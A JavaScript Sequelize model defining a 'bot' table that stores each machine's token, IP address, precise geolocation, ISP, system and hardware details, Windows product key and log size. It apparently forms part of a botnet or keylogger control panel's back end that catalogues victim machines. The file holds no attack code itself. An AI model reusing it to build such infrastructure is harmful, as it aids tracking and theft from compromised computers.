module.exports = (sequelize, Sequelize) => {
    const Bot = sequelize.define("bot", {
        tag: {
            type: Sequelize.STRING,
            allowNull: true,
        },
        identifier: {
            type: Sequelize.STRING,
            allowNull: false,
        },
        token: {
            type: Sequelize.STRING,
            allowNull: false,
        },
        ipAddress: {
            type: Sequelize.STRING,
            allowNull: false,
        },
        country: {
            type: Sequelize.STRING,
            allowNull: false,
        },
        countryCode: {
            type: Sequelize.STRING,
            allowNull: false,
        },
        region: {
            type: Sequelize.STRING,
            allowNull: false,
        },
        regionCode: {
            type: Sequelize.STRING,
            allowNull: false,
        },
        city: {
            type: Sequelize.STRING,
            allowNull: false,
        },
        lat: {
            type: Sequelize.STRING,
            allowNull: false,
        },
        lon: {
            type: Sequelize.STRING,
            allowNull: false,
        },
        isp: {
            type: Sequelize.STRING,
            allowNull: false,
        },
        operatingSystem: {
            type: Sequelize.STRING,
            allowNull: true,
        },
        nodeName: {
            type: Sequelize.STRING,
            allowNull: true,
        },
        release: {
            type: Sequelize.STRING,
            allowNull: true,
        },
        version: {
            type: Sequelize.STRING,
            allowNull: true,
        },
        processor: {
            type: Sequelize.STRING,
            allowNull: true,
        },
        architecture: {
            type: Sequelize.STRING,
            allowNull: true,
        },
        bootTime: {
            type: Sequelize.STRING,
            allowNull: true,
        },
        cpuCores: {
            type: Sequelize.STRING,
            allowNull: true,
        },
        memory: {
            type: Sequelize.STRING,
            allowNull: true,
        },
        windowsKey: {
            type: Sequelize.STRING,
            allowNull: true,
        },
        logSize: {
            type: Sequelize.STRING,
            allowNull: false,
            defaultValue: 0,
        },
    });
    return Bot;
};
